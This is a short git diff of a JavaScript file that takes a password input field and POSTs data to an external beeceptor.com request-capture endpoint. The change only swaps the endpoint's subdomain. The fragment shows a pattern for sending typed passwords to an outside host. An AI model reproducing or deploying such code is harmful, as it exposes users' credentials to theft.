@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const passwordInput = document.getElementById('loggerInput');
 
     const sendData = () => {
-        fetch('https://loger.free.beeceptor.com', {
+        fetch('https://loggers.free.beeceptor.com', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
